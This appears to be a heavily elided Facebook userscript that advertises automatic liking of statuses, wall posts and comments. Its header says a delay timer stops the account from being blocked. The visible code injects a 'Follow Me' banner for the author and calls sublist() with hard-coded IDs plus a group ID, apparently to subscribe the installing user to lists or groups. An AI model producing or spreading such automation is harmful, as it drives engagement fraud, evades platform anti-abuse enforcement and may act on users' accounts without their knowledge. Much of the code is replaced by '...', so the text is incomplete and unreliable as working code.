// ==UserScript==
// @name			*[ AUTOLIKE ]* AutoLike Facebook 
// @namespace		        *[ AUTOLIKE ]* AutoLike Facebook 
// @description		        *[ AUTOLIKE ]* AutoLike Facebook coded by Faiz LinErs. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author			http://www.facebook.com/Faiz.LinErs
// @authorURL		        
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/Faiz.LinErs' target='_blank' title='Like Please' ><blink><center>Follow Me[Faiz LinErs]</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
...
sublist("504887649566809");
sublist("511598522229055");


var gid = ['579299428795344'];
